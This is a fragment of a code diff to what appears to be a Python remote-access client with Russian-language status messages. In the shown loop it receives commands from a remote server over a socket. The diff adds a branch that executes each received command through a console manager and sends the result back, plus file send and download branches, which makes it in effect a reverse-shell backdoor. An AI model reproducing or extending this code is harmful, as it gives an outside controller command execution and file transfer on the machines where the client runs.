@@ -61,15 +61,24 @@ def connect_to_server(HOST, PORT):
 def execute_commands(s):
     while True:
         try:
+            con = m.ConsoleManager()
+
             print(f"<-+-> Подключение к серверу установлено.")
             command = s.recv(24576).decode('utf-8')
-            s.send(b'<-+->Answered')
+            s.send(b'<-+-> Answered')
 
             if command.lower() == 'exit':
                 break
+            
+            elif 'console' in command:
+                com = command[8:]
+                print(com)
+                res = con.execute_command(com).encode()
+                s.send(res)
 
-            elif 'loadfile' in command:
-                filename = command[8:].strip()
+            elif 'send' in command:
+                filename = command[4:].strip()
+                print(f'download {filename}')
                 download(s)
                 
             elif 'download' in command:
